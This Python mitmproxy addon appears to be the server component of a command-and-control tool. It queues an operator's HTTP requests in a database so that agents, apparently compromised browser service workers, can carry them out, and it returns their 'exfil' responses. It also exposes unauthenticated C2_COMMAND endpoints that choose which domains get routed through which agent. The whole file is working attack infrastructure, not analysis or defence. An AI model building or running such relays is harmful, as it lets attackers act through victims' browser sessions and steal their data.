import time
import uuid
import json
import base64
import config
import re
from datetime import datetime
from mitmproxy import http
from mitmproxy import ctx
from mitmproxy.script import concurrent
from database.models import Url, Registration
from sqlalchemy.orm import scoped_session, sessionmaker
from sqlalchemy import create_engine
from sqlalchemy.ext.declarative import declarative_base
from config import Config

engine = create_engine(Config.SQLALCHEMY_DATABASE_URI, echo = False)
# create for multi thread
Session = scoped_session(sessionmaker(engine, autoflush = True))

HTTP_TIMEOUT = 10  # in seconds
ProxyWhiteList = {} # list of regex to match domains to traffic through agents

class hold:

    @concurrent
    def request(self, flow):

        global ProxyWhiteList

        ###Incomming REQUEST Preparation to extract the info we need
        Request_data = {}
        Request_data['method'] = flow.request.method
        Request_data['headers'] = {}
        Request_data['url'] = flow.request.url
        print("flow.request.url=" + flow.request.url)
        print("flow.request.host %s and %s port " % (flow.request.host,flow.request.port))
        Request_data['path'] = flow.request.path
        Request_data['scheme'] = flow.request.scheme
        if flow.request.content:
            Request_data['body'] = str(base64.b64encode(flow.request.content), 'utf-8')
        for cur_header in flow.request.headers:
            if (cur_header.lower().startswith("content-type")) or (cur_header.lower().startswith("x-")):
                Request_data['headers'][cur_header] = flow.request.headers[cur_header]

        cur_uuid = str(uuid.uuid4())
        ###Incomming REQUEST Prep ENDS

        ###CHECK if command is to/from c2###
        #TODO: need to implement security to check C2 commands are legit
        #Examples of command:
            # example.com/C2_COMMAND?action=setproxy&domain=.*watever.*&port=*&agentID=AGe777
            # example.com/C2_COMMAND?action=getproxy
            # example.com/C2_COMMAND?action=clearproxy
        print ("Request_data['path'] =%s " %Request_data['path'])
        if Request_data['path'].startswith("/C2_COMMAND"):
            print("C2_COMMAND")
            
            if "action" not in flow.request.query:
                resp = http.HTTPResponse.make(400, "<html><body>invalid c2 cmd</body></html>", {"Content-Type": "text/html"})
                return 1
            
            if (flow.request.query['action'] == "setproxy"):
                #TODO: Validate that GET perams for port,domains etc exists
                setpattern=flow.request.query['domain']+":" 
                setpattern+=".*" if flow.request.query['port'] == "" else flow.request.query['port']
                setpattern+="$" #Regex $ anchors to end of line
                ProxyWhiteList[setpattern] = flow.request.query['agentID']
                ProxyWhiteList['agentID'] = flow.request.query['agentID']
                resp = http.HTTPResponse.make(200, "<html><body>Proxy set!</body></html>", {"Content-Type": "text/html"})

                for cur_pattern, cur_agent in ProxyWhiteList.items():
                    print ("Proxy-whitelisted %s-%s"%(cur_pattern,cur_agent))                 


            if (flow.request.query['action'] == "getproxy"):
                tempstring=""
                for cur_pattern, cur_agent in ProxyWhiteList.items():
                    tempstring+='%s:"%s",' %(json.dumps(cur_agent),json.dumps(cur_pattern))
                print(json.dumps(ProxyWhiteList))

                resp = http.HTTPResponse.make(200, json.dumps(ProxyWhiteList), {"Content-Type": "application/json"})

            if (flow.request.query['action'] == "clearproxy"):
                ProxyWhiteList={}
                resp = http.HTTPResponse.make(200, "Proxies Cleared", {"Content-Type": "text/html"})


            flow.response = resp
            return 1 

        ###END CHECK C2 Command###

        ##Filter requests through ProxyWhiteList to pass requests to Agents if they match. Else direct connection (via mitm_proxy)
        ProxyMatch=False
        for pattern,agentID in ProxyWhiteList.items():
            if re.match(pattern,flow.request.host +":"+str(flow.request.port)) :
                ProxyMatch=True
                resp = http.HTTPResponse.make(200, "<html><body>MATCHED %s</body></html>" % pattern, {"Content-Type": "text/html"})
                break

        if ProxyMatch is False:
            # There's no agent that can handle the requests, so direct connection out via mitm_proxy
            return 0
        #else:
        #    flow.response = resp
        #    return 1

        ##End Filter requests check


        # Commit requests to DB
        print("*Request::" + flow.request.url + "::" + cur_uuid)
        timestamp = datetime.now() #.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d %H:%M:%S')
        db_session = Session()
        url = Url(cur_uuid, flow.request.url, json.dumps(Request_data), None, 0, ProxyWhiteList['agentID'], timestamp)
        db_session.add(url)
        db_session.commit()
        db_session.close()
        
        # C2.py will poll the DB and transmit request to Service worker.
        # All we can do is to wait for response back from Service worker.
        # Flow is as such: sw_mitm.py->DB->c2.py->SW->c2.py->DB->sw_mitm.py
        print("[Waiting]" + flow.request.path + "::" + cur_uuid)
        for x in range(0, int(HTTP_TIMEOUT / 0.3)):
            time.sleep(0.3)
            db_session = Session()
            url = db_session.query(Url).filter(Url.processed == 1, Url.response != None, Url.id == cur_uuid, Url.agentId == ProxyWhiteList['agentID']).first()
            if url is None:
                db_session.close()
                continue
            else:
                response = url.response
                try:
                    exfil = json.loads(response)
                except Exception as ex:
                    continue
                finally:
                    db_session.close()
                resp = http.HTTPResponse.make(exfil['status'], base64.b64decode(exfil['DATA']), exfil['headers'])
                flow.response = resp
                return
        print("can't retrieve " + cur_uuid)
        resp = http.HTTPResponse.make(404, "<html><body>Can't retrieve</body></html>", {"Content-Type": "text/html"})
        flow.response = resp
        return 1

addons = [
    hold()
]
